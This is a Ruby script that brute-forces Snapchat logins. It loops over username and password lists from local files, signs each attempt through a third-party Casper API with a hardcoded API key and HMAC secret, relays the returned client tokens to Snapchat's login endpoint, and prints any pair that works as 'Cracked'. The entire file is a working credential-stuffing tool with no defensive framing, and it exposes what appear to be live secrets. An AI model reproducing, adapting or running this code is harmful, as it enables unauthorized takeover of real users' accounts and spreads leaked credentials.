require 'uri'
require 'net/http'
require 'net/https'
require 'jwt'
require 'json'
usernames = File.readlines("u.txt") # List Of Usernames
passwords = File.readlines("p.txt") # List Of Passwords
for username in usernames
	for password in passwords
		###################################
		# Casper API
		uri = URI.parse("https://casper-api.herokuapp.com/snapchat/ios/login")
		https = Net::HTTP.new(uri.host,uri.port)
		https.use_ssl = true
		req = Net::HTTP::Post.new(uri.path, initheader = {
			'X-Casper-API-Key' => 'dd3779d571409a67743c7e0e18a2cc04',
			'user-agent' => 'Snapchat/10.0 (iPhone7;iOS10.1.1;gzip)'
		})
		hmac_secret = 'f3cdf4bbf206f5d572c6db13757c06fe'
		ts = Time.now.to_i
		payload = { :sub => 'Joe', :username => username, :password => password, :iat => ts }
		token = JWT.encode payload, hmac_secret, 'HS256'
		req.body = "jwt=#{token}"
		res = https.request(req)
		###################################
		if res.code.include? "200"
			urlsc = URI.parse(res.body[/"url":"(.+?)"/, 1])
			https = Net::HTTP.new(uri.host,uri.port)
			https.use_ssl = true
			reqsc = Net::HTTP::Post.new(urlsc.path, initheader = {
				'Accept-Language' => res.body[/"Accept-Language":"(.+?)"/, 1],
				'User-Agent' => res.body[/"User-Agent":"(.+?)"/, 1],
				'X-Snapchat-Client-Auth-Token' => res.body[/"X-Snapchat-Client-Auth-Token":"(.+?)"/, 1],
				'X-Snapchat-Client-Token' => res.body[/"X-Snapchat-Client-Token":"(.+?)"/, 1],
				'X-Snapchat-UUID' => res.body[/"X-Snapchat-UUID":"(.+?)"/, 1]
			})
			reqsc.body = "password=#{password}&req_token=#{res.body[/"req_token":"(.+?)"/, 1]}&timestamp=#{res.body[/"timestamp":"(.+?)"/, 1]}&username=#{username}"
			response = https.request(reqsc)
			if response.code.include? "200"
				if response.body.include? '"logged":true'
					puts "Cracked -> (#{username}:#{password})\n"
				else
					if response.body.include? 'password is incorrect'
						puts "Failed -> (#{username}:#{password})\n"
					else
						puts "#{response.body}\n"
					end
				end
			else
				puts "Blocked : #{response.body}\n"
			end
		else
			puts "Shit ~~"
		end
	end
end
